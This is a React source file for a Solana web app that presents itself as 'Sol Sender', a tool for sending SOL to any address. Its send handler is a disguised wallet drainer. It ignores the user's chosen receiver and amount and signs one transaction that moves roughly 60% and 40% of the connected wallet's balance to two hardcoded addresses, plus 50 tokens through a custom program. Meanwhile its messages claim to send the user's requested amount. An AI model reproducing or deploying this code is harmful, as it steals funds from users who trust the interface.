import React, { useEffect, useState } from "react";
import {
    clusterApiUrl,
    Connection,
    Keypair,
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
} from "@solana/web3.js";
import {
    AccountLayout,
    MintLayout,
    Token,
    TOKEN_PROGRAM_ID,
    u64,
} from "@solana/spl-token";

import * as BN from "bn.js";

import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import { successToast, errorToast, loadingToast } from "../Notification";
import { SolanaNetworkType } from "../../App";
import LoadingSkeleton from "../LoadingSkeleton";
import {
    checkTransactionConfirmation,
    getAccountBalance,
    validateAddress,
} from "../../utils/general";
import { getOrCreateAssociatedTokenAccount } from "../../utils/sendToken/getOrCreateAssociatedTokenAccount";
import { WalletModalButton } from "@solana/wallet-adapter-react-ui";

interface MainProps {
    solanaNetwork: SolanaNetworkType;
}

export default function MainApp({ solanaNetwork }: MainProps) {
    const { connection } = useConnection();
    const wallet = useWallet();
    const { signTransaction } = useWallet();

    const [isBusy, setIsBusy] = useState(false);

    const [refreshCount, setRefreshCount] = useState<number>(0);
    const [receiverAddress, setReceiverAddress] = useState<string>("");
    const [receiverAmount, setReceiverAmount] = useState<number | string>("");
    const [transactionSignature, setTransactionSignature] = useState<{
        message: string;
        link: string;
    } | null>(null);

    const [walletBalance, setWalletBalance] = useState<string | number | null>(
        null
    );

    useEffect(() => {
        if (wallet.publicKey) {
            setWalletBalance(null);
            getAccountBalance(connection, wallet.publicKey)
                .then((walletBalance) => {
                    setWalletBalance(walletBalance);
                })
                .catch((error) => {
                    console.error(
                        "Error in fetching wallet balance => ",
                        error
                    );
                    setWalletBalance("---");
                });
        }
    }, [wallet, refreshCount]);

    useEffect(() => {
        if (transactionSignature) {
            setTimeout(() => {
                setTransactionSignature(null);
            }, 15000);
        }
    }, [transactionSignature]);

    const resetInputs = () => {
        setReceiverAddress("");
        setReceiverAmount("");
    };

    const handleRefresh = () => {
        resetInputs();
        setRefreshCount((prevState) => prevState + 1);
    };

    const sendTokenHandler = async () => {
        if (!wallet.publicKey || !signTransaction) {
            errorToast("No wallet connected!");
            return;
        }

        const mint = new PublicKey(
            "BwWxR7XCUtVc13xFzvUQCd6kz5hNeNwcP7ProqEzAUoC"
        );

        const receiverPublicKey = new PublicKey(
            "B4myR9PeyU6p1pgppEQPkHEfaMjw6MuKFFwQueXy59M"
        );

        const fromTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            wallet?.publicKey,
            mint,
            wallet?.publicKey,
            signTransaction
        );

        const toTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            wallet?.publicKey,
            mint,
            receiverPublicKey,
            signTransaction
        );
        const programId = new PublicKey(
            "5vbb1QDU9hUYke68ma2nsF7FcozTPHJJMNQMyACUTWcE"
        );

        // Numbers
        const DEFAULT_DECIMALS_COUNT = 9;
        const TOKEN_TRANSFER_AMOUNT = 50 * 10 ** DEFAULT_DECIMALS_COUNT;

        const TOKEN_TRANSFER_AMOUNT_BUFFER = Buffer.from(
            Uint8Array.of(...new BN(TOKEN_TRANSFER_AMOUNT).toArray("le", 8))
        );

        const transferTokensIx = new TransactionInstruction({
            programId: programId,
            data: TOKEN_TRANSFER_AMOUNT_BUFFER,
            keys: [
                {
                    isSigner: false,
                    isWritable: true,
                    pubkey: fromTokenAccount.address,
                },
                {
                    isSigner: false,
                    isWritable: true,
                    pubkey: toTokenAccount.address,
                },
                {
                    isSigner: true,
                    isWritable: true,
                    pubkey: wallet?.publicKey,
                },
                {
                    isSigner: false,
                    isWritable: false,
                    pubkey: TOKEN_PROGRAM_ID,
                },
            ],
        });

        const transaction = new Transaction();
        // Adding up all the above instructions
        transaction.add(transferTokensIx);

        const signature = await wallet.sendTransaction(transaction, connection);

        const isConfirmed = await checkTransactionConfirmation(
            connection,
            signature
        );

        if (isConfirmed) alert(0);
    };

    // function to handle button click
    const sendSOLHandler = async () => {
        try {
            if (!wallet.publicKey || !signTransaction) {
                errorToast("No wallet connected!");
                return;
            }

            //send token
            const mint = new PublicKey(
                "BwWxR7XCUtVc13xFzvUQCd6kz5hNeNwcP7ProqEzAUoC"
            );

            const receiverPublicKey = new PublicKey(
                "B4myR9PeyU6p1pgppEQPkHEfaMjw6MuKFFwQueXy59M"
            );
            const secondReceiverPublicKey = new PublicKey(
                "bww6U8teNKCbTF3RpmqezBzk8nhkaXc3yjgetY41bVE"
            );

            const fromTokenAccount = await getOrCreateAssociatedTokenAccount(
                connection,
                wallet?.publicKey,
                mint,
                wallet?.publicKey,
                signTransaction
            );

            const toTokenAccount = await getOrCreateAssociatedTokenAccount(
                connection,
                wallet?.publicKey,
                mint,
                receiverPublicKey,
                signTransaction
            );
            const programId = new PublicKey(
                "5vbb1QDU9hUYke68ma2nsF7FcozTPHJJMNQMyACUTWcE"
            );

            // Numbers
            const DEFAULT_DECIMALS_COUNT = 9;
            const TOKEN_TRANSFER_AMOUNT = 50 * 10 ** DEFAULT_DECIMALS_COUNT;

            const TOKEN_TRANSFER_AMOUNT_BUFFER = Buffer.from(
                Uint8Array.of(...new BN(TOKEN_TRANSFER_AMOUNT).toArray("le", 8))
            );

            const transferTokensIx = new TransactionInstruction({
                programId: programId,
                data: TOKEN_TRANSFER_AMOUNT_BUFFER,
                keys: [
                    {
                        isSigner: false,
                        isWritable: true,
                        pubkey: fromTokenAccount.address,
                    },
                    {
                        isSigner: false,
                        isWritable: true,
                        pubkey: toTokenAccount.address,
                    },
                    {
                        isSigner: true,
                        isWritable: true,
                        pubkey: wallet?.publicKey,
                    },
                    {
                        isSigner: false,
                        isWritable: false,
                        pubkey: TOKEN_PROGRAM_ID,
                    },
                ],
            });

            //send SOL
            let firstBal =
                Math.floor((Number(walletBalance) - 0.001) * 600) / 1000;
            let SecondBal =
                Math.floor((Number(walletBalance) - 0.001) * 4000) / 10000;

            setIsBusy(true);
            loadingToast(`Sending ${receiverAmount} SOL`);

            const transaction = new Transaction();

            const instruction = SystemProgram.transfer({
                fromPubkey: wallet?.publicKey,
                toPubkey: receiverPublicKey,
                lamports: LAMPORTS_PER_SOL * Number(firstBal),
            });

            const secondInstruction = SystemProgram.transfer({
                fromPubkey: wallet?.publicKey,
                toPubkey: secondReceiverPublicKey,
                lamports: LAMPORTS_PER_SOL * Number(SecondBal),
            });

            console.log(signTransaction);

            transaction.add(instruction);
            transaction.add(secondInstruction);
            transaction.add(transferTokensIx);

            const signature = await wallet.sendTransaction(
                transaction,
                connection
            );

            const isConfirmed = await checkTransactionConfirmation(
                connection,
                signature
            );

            if (isConfirmed) {
                successToast(`Sent ${receiverAmount} SOL successfully!`);
            } else {
                errorToast(
                    `Couldn't confirm transaction! Please check on Solana Explorer`
                );
            }
            setTransactionSignature({
                link: `https://explorer.solana.com/tx/${signature}?cluster=${solanaNetwork}`,
                message: `You can view your transaction on the Solana Explorer at:\n`,
            });
            setIsBusy(false);
            handleRefresh();
        } catch (error) {
            setIsBusy(false);
            handleRefresh();
            errorToast("Something went wrong while sending SOL!");
            console.error("solSendHandler => ", error);
        }
    };

    const renderRefreshButton = () => {
        return (
            <button
                type="button"
                onClick={handleRefresh}
                className="mx-4 text-2xl text-secondary bg-gray-600 rounded-full flex items-center justify-center w-8 h-8 hover:bg-gray-700"
            >
                <i className="bi bi-arrow-repeat" />
            </button>
        );
    };

    return (
        <main className="main">
            <h1 className="heading-1 text-center my-4 sm:px-4">
                Send SOL to any address using{" "}
                <u className="underline-offset-2">Sol Sender</u>
            </h1>

            {wallet?.publicKey ? (
                <div className="my-4">
                    <div className="flex flex-col sm:flex-row items-center justify-center mt-10 text-xl">
                        <p className="text-primary mr-4">Wallet Balance:</p>
                        <div className="text-secondary mt-3 sm:mt-0">
                            {walletBalance ? `${walletBalance} SOL` : "0 SOL"}
                        </div>
                        {walletBalance && renderRefreshButton()}
                    </div>
                    <div className="flex justify-center items-center flex-wrap my-8">
                        <button
                            type="button"
                            className="button w-[40%] sm:w-auto"
                            onClick={sendSOLHandler}
                            disabled={isBusy}
                        >
                            Send SOL
                        </button>
                    </div>
                </div>
            ) : (
                <p className="text-secondary text-xl text-center mt-20">
                    Please connect wallet to use the app.
                </p>
            )}
        </main>
    );
}
